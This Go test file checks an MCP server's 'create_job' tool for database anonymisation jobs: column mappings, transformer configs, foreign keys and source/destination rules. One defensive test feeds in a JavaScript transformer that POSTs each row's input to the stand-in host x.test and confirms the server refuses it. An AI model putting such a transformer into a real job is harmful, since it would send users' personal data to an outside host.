package mcp_server

import (
	"encoding/json"
	"testing"

	"github.com/stretchr/testify/require"
)

// usersMappings maps every column of public.users.
func usersMappings() []map[string]any {
	return []map[string]any{
		{"table": "public.users", "column": "id", "transformer": "passthrough"},
		{"table": "public.users", "column": "email", "transformer": "generate_email"},
		{"table": "public.users", "column": "birth_date", "transformer": "passthrough"},
	}
}

func createArgs(mappings []map[string]any) map[string]any {
	return map[string]any{
		"name":                 "shop-anon",
		"source_connection_id": connectionId,
		"destinations":         []map[string]any{{"connection_id": destinationId, "truncate_before_insert": true}},
		"mappings":             mappings,
	}
}

func Test_CreateJob(t *testing.T) {
	t.Parallel()

	t.Run("creates a job that runs only when asked", func(t *testing.T) {
		t.Parallel()
		jobService := newFakeJobService()
		session := connectJobs(t, jobService, nil)

		res := callTool(t, session, "create_job", createArgs(usersMappings()))

		created, _, triggered := jobService.seen()
		require.Len(t, created, 1)
		req := created[0]
		require.Equal(t, accountId, req.GetAccountId())
		require.Equal(t, "shop-anon", req.GetJobName())
		require.Nil(t, req.CronSchedule, "no schedule")
		require.False(t, req.GetInitiateJobRun(), "no run on creation")
		require.Empty(t, triggered)

		source := req.GetSource().GetOptions().GetPostgres()
		require.Equal(t, connectionId, source.GetConnectionId())
		require.NotNil(t, source.GetNewColumnAdditionStrategy().GetHaltJob(), "a new column halts the run by default")
		require.NotNil(t, source.GetColumnRemovalStrategy().GetContinueJob(), "a column gone carries on, as in the UI")

		require.Len(t, req.GetDestinations(), 1)
		require.Equal(t, destinationId, req.GetDestinations()[0].GetConnectionId())
		require.True(t, req.GetDestinations()[0].GetOptions().GetPostgresOptions().GetTruncateTable().GetTruncateBeforeInsert())
		require.False(t, req.GetDestinations()[0].GetOptions().GetPostgresOptions().GetTruncateTable().GetCascade())

		require.Len(t, req.GetMappings(), 3)
		require.NotNil(t, req.GetMappings()[1].GetTransformer().GetConfig().GetGenerateEmailConfig())
		require.NotNil(t, req.GetMappings()[0].GetTransformer().GetConfig().GetPassthroughConfig())

		structured, err := json.Marshal(res.StructuredContent)
		require.NoError(t, err)
		require.JSONEq(
			t,
			`{"job_id": "`+createdJobId+`", "name": "shop-anon", "tables": ["public.users"], "columns": 3}`,
			string(structured),
		)
	})

	t.Run("maps the columns that appear when asked to", func(t *testing.T) {
		t.Parallel()
		jobService := newFakeJobService()
		session := connectJobs(t, jobService, nil)

		args := createArgs(usersMappings())
		args["new_columns"] = "auto_map"
		callTool(t, session, "create_job", args)

		created, _, _ := jobService.seen()
		require.NotNil(t, created[0].GetSource().GetOptions().GetPostgres().GetNewColumnAdditionStrategy().GetAutoMap())
	})

	t.Run("refuses a table left partly unmapped, naming what is missing", func(t *testing.T) {
		t.Parallel()
		jobService := newFakeJobService()
		session := connectJobs(t, jobService, nil)

		message := callToolError(t, session, "create_job", createArgs([]map[string]any{
			{"table": "public.users", "column": "email", "transformer": "generate_email"},
		}))
		require.Contains(t, message, "missing: public.users.birth_date, public.users.id")
		created, _, _ := jobService.seen()
		require.Empty(t, created)
	})

	t.Run("sets the config given over the default one, false included", func(t *testing.T) {
		t.Parallel()
		jobService := newFakeJobService()
		session := connectJobs(t, jobService, nil)

		mappings := usersMappings()
		mappings[1] = map[string]any{
			"table": "public.users", "column": "email", "transformer": "transform_email",
			"config": map[string]any{"preserve_domain": false, "preserve_length": true},
		}
		callTool(t, session, "create_job", createArgs(mappings))

		created, _, _ := jobService.seen()
		config := created[0].GetMappings()[1].GetTransformer().GetConfig().GetTransformEmailConfig()
		require.NotNil(t, config)
		require.False(t, config.GetPreserveDomain(), "the default says true, the call says false")
		require.True(t, config.GetPreserveLength())
	})

	t.Run("refuses a config field the transformer does not have", func(t *testing.T) {
		t.Parallel()
		jobService := newFakeJobService()
		session := connectJobs(t, jobService, nil)

		mappings := usersMappings()
		mappings[1]["config"] = map[string]any{"shred": true}
		message := callToolError(t, session, "create_job", createArgs(mappings))
		require.Contains(t, message, "public.users.email")
		created, _, _ := jobService.seen()
		require.Empty(t, created)
	})

	t.Run("refuses to write into its own source", func(t *testing.T) {
		t.Parallel()
		jobService := newFakeJobService()
		session := connectJobs(t, jobService, nil)

		args := createArgs(usersMappings())
		args["destinations"] = []map[string]any{{"connection_id": connectionId}}
		message := callToolError(t, session, "create_job", args)
		require.Contains(t, message, "the source cannot be a destination")
	})

	t.Run("refuses a transformer that runs code", func(t *testing.T) {
		t.Parallel()
		jobService := newFakeJobService()
		session := connectJobs(t, jobService, nil)

		mappings := usersMappings()
		mappings[1] = map[string]any{
			"table": "public.users", "column": "email", "transformer": "transform_javascript",
			"config": map[string]any{"code": "benthos.v0_fetch('https://x.test', {}, 'POST', JSON.stringify(input))"},
		}
		message := callToolError(t, session, "create_job", createArgs(mappings))
		require.Contains(t, message, "code written by an agent is not run here")
		created, _, _ := jobService.seen()
		require.Empty(t, created)
	})

	t.Run("refuses a destination on the database of its source", func(t *testing.T) {
		t.Parallel()
		session := connectJobs(t, newFakeJobService(), nil)

		args := createArgs(usersMappings())
		args["destinations"] = []map[string]any{{"connection_id": aliasId, "truncate_before_insert": true}}
		message := callToolError(t, session, "create_job", args)
		require.Contains(t, message, "points at the database the source")
	})

	t.Run("is held to the API's rule for each column", func(t *testing.T) {
		t.Parallel()
		jobService := newFakeJobService()
		session := connectJobs(t, jobService, nil)

		mappings := append(usersMappings(),
			map[string]any{"table": "public.orders", "column": "id", "transformer": "passthrough"},
			map[string]any{"table": "public.orders", "column": "user_id", "transformer": "generate_email"},
			map[string]any{"table": "public.orders", "column": "note", "transformer": "passthrough"},
		)
		message := callToolError(t, session, "create_job", createArgs(mappings))
		require.Contains(t, message,
			"public.orders.user_id: generate_email does not fit this column; it takes passthrough, transform_javascript")
		created, _, _ := jobService.seen()
		require.Empty(t, created)
	})

	t.Run("refuses a table without the one its foreign key needs", func(t *testing.T) {
		t.Parallel()
		session := connectJobs(t, newFakeJobService(), nil)

		message := callToolError(t, session, "create_job", createArgs([]map[string]any{
			{"table": "public.orders", "column": "id", "transformer": "passthrough"},
			{"table": "public.orders", "column": "user_id", "transformer": "passthrough"},
			{"table": "public.orders", "column": "note", "transformer": "passthrough"},
		}))
		require.Contains(t, message, "public.users.id: Missing required foreign key")
	})

	t.Run("refuses a column mapped twice", func(t *testing.T) {
		t.Parallel()
		session := connectJobs(t, newFakeJobService(), nil)

		mappings := append(usersMappings(), map[string]any{
			"table": "public.users", "column": "email", "transformer": "passthrough",
		})
		message := callToolError(t, session, "create_job", createArgs(mappings))
		require.Contains(t, message, "public.users.email is mapped twice")
	})

	t.Run("refuses a column that is not there", func(t *testing.T) {
		t.Parallel()
		session := connectJobs(t, newFakeJobService(), nil)

		mappings := append(usersMappings(), map[string]any{
			"table": "public.users", "column": "nope", "transformer": "passthrough",
		})
		message := callToolError(t, session, "create_job", createArgs(mappings))
		require.Contains(t, message, "no column nope in public.users")
	})
}
